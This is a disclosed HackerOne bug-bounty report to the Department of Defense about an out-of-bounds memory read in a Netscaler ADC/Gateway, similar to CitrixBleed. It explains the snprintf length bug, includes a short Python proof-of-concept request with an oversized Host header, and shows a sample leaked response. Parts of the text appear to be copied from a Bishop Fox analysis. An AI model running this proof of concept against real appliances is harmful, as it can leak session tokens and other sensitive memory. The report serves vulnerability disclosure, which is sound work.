# Out-Of-Bounds Memory Read on ███

## Report Details
- **Report ID**: 2509402
- **URL**: https://hackerone.com/reports/2509402
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2024-05-16T19:04:15.470Z
- **Disclosed**: 2024-06-18T16:59:47.739Z

## Reporter
- **Username**: maskedpersian
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Vulnerability Identifier: OOB Memory Read (CVE-ID Pending)

Affected System: Netscaler ADC and Gateway deployed at https://███████/nf/auth/doAuthentication.do

Overview:
An out-of-bounds (OOB) memory read vulnerability has been identified in Netscaler ADC (Application Delivery Controller) and Gateway, which are network appliances used for load balancing, security, and traffic management. This vulnerability affects the instance deployed at https://███/nf/auth/doAuthentication.do. Exploitation of this vulnerability could potentially lead to unauthorized access to sensitive information, service disruption, or further exploitation of the affected system.

Vulnerability Details:
The OOB memory read vulnerability arises due to improper input validation or boundary checking within the affected Netscaler ADC and Gateway appliances. Attackers may exploit this vulnerability by crafting malicious requests or payloads designed to trigger an out-of-bounds memory read condition. Successful exploitation could allow attackers to read arbitrary memory locations, potentially leading to the disclosure of sensitive information or the execution of unauthorized actions within the context of the affected system.

The following Python proof-of-concept code can be used to demonstrate exploitability when executed against a vulnerable appliance:
```
import requests 
url = "https://███/nf/auth/startwebview.do"  
r = requests.get(url, headers={"Host":"A"*0x5000}, verify=False)  

print(r.content[0x1800:])
```
Requests to the /nf/auth/startwebview.do URI are handled by the ns_aaa_start_webview_for_authv3 function. The ns_aaa_start_webview_for_authv3 function constructs an XML response using the snprintf function and returns this response to the user by calling the ns_vpn_send_response function, as shown below:
```
sprintf(print_temp_rule,"%s%.*s%s",proto,iVar5 - (int)host_hdr,host_hdr, 
  "/nf/auth/doWebview.do"); 
length = snprintf(&ns_HttpRedirectPkt,0x1800, 
  "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><AuthenticateRespo nse xmlns=\"http://citrix.com/authentication/response/1\"><Status>success</Statu s><Result>more-info</Result><StateContext></StateContext><AuthenticationRequirem ents><PostBack>/nf/auth/webview/done</PostBack><CancelPostBack>/nf/auth/doLogoff .do</CancelPostBack><CancelButtonText>Cancel</CancelButtonText><Requirements><Re quirement><Credential><ID>samlResponse</ID><Type>webview</Type><wv:WebView xmlns :wv=\"http://citrix.com/authentication/response/webview/1\"><wv:StartUrl>%.*s</w v:StartUrl></wv:WebView></Credential><Label><Type>none</Type></Label><Input/></R equirement></Requirements></AuthenticationRequirements></AuthenticateResponse>" 
  ,length,print_temp_rule); 
ns_vpn_send_response(lVar1,0x980200,&ns_HttpRedirectPkt,length);
```
The ns_vpn_send_response function sends an HTTP response where the body and size of the body are provided as parameters. In the code shown above, the size is set to the return value from the snprintf function. According to the documentation for the snprintf function, the return value is the number of characters that would have been written if enough space had been available. Therefore, if the constructed response would have exceeded the buffer size (0x1800 bytes in this case), the ns_vpn_send_response function will respond with extra data past the end of the buffer. This is identical to the underlying cause of CVE-2023-4966 (CitrixBleed).

The unsafe use of the sprintf function in the ns_aaa_start_webview_for_authv3 function is discussed in more detail in the Insecure String Handling finding of this report.

Bishop Fox staff analyzed prior releases of vulnerable Citrix deployments and observed instances where the disclosed memory contained data from HTTP requests, sometimes including POST request bodies. For example, the response below includes data from another HTTP request processed by the appliance, apparently related to a Nessus vulnerability scan:
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><AuthenticateResponse xmlns="http://citrix.com/authentication/response/1"><Status>success</Status><Result>more-info</Result><StateContext></StateContext><AuthenticationRequirements><PostBack>/nf/auth/webview/done</PostBack><CancelPostBack>/nf/auth/doLogoff.do</CancelPostBack><CancelButtonText>Cancel</CancelButtonText><Requirements><Requirement><Credential><ID>samlResponse</ID><Type>webview</Type><wv:WebView xmlns:wv="http://citrix.com/authentication/response/webview/1"><wv:StartUrl>https://█████████/nf/auth/doWebview.do</wv:StartUrl></wv:WebView></Credential><Label><Type>none</Type></Label><Input/></Requirement></Requirements></AuthenticationRequirements></AuthenticateResponse>
```

## Impact

Impact:
If successfully exploited, the OOB memory read vulnerability in Netscaler ADC and Gateway could have several adverse consequences, including:

1-Information Disclosure: Attackers may be able to read sensitive data stored in memory, such as cryptographic keys, session tokens, or configuration details, leading to unauthorized access or further compromise of the system.
2-Service Disruption: Exploitation of the vulnerability could result in the disruption or denial of service for legitimate users, impacting the availability and performance of the affected services or applications.
3-Privilege Escalation: In some scenarios, attackers may leverage the information obtained through OOB memory reads to escalate their privileges or execute additional attacks against the affected system or its users.

## System Host(s)
██████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
python code

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
